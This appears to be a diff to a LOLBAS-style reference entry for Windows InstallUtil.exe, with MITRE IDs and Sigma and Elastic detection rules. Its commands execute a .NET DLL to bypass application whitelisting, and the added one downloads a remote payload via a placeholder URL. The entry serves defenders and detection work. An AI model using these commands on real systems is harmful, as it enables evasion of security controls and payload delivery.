@@ -1,34 +1,48 @@
 ---
 Name: Installutil.exe
 Description: The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+  - Command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
     Description: Execute the target .NET DLL or EXE.
     Usecase: Use to execute code and bypass application whitelisting
-    Category: AWL bypass
+    Category: AWL Bypass
     Privileges: User
     MitreID: T1218.004
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: DLL (.NET)
+      - Execute: EXE (.NET)
+  - Command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
     Description: Execute the target .NET DLL or EXE.
     Usecase: Use to execute code and bypass application whitelisting
     Category: Execute
     Privileges: User
     MitreID: T1218.004
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: DLL (.NET)
+      - Execute: EXE (.NET)
+  - Command: InstallUtil.exe {REMOTEURL}
+    Description: It will download a remote payload and place it in INetCache.
+    Usecase: Downloads payload from remote server
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
 Full_Path:
   - Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
   - Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
   - Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
   - Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
-Code_Sample:
-- Code:
 Detection:
- - Sigma: https://github.com/SigmaHQ/sigma/blob/a04fbe2a99f1dcbbfeb0ee4957ae4b06b0866254/rules/windows/process_creation/win_possible_applocker_bypass.yml
- - Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml
- - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml
+  - Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml
+  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
 Resources:
   - Link: https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
   - Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
@@ -39,4 +53,5 @@ Resources:
 Acknowledgement:
   - Person: Casey Smith
     Handle: '@subtee'
----
+  - Person: Nir Chako (Pentera)
+    Handle: '@C_h4ck_0'
